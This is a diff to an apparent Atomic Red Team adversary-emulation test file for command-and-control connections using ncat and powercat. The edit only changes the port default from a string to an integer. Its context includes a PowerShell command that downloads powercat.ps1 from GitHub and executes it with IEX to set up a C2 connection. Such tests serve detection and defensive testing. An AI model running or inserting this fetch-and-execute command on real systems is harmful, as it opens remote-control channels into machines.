@@ -29,8 +29,7 @@ atomic_tests:
   input_arguments:
     server_port:
       description: The port for the C2 connection
-      type: integer
-      default: "80"
+      default: 80
     ncat_exe:
       description: The location of ncat.exe
       type: Path
@@ -78,8 +77,7 @@ atomic_tests:
       default: 127.0.0.1
     server_port:
       description: The port for the C2 connection
-      type: integer
-      default: "80"
+      default: 80
   executor:
     command: |
       IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
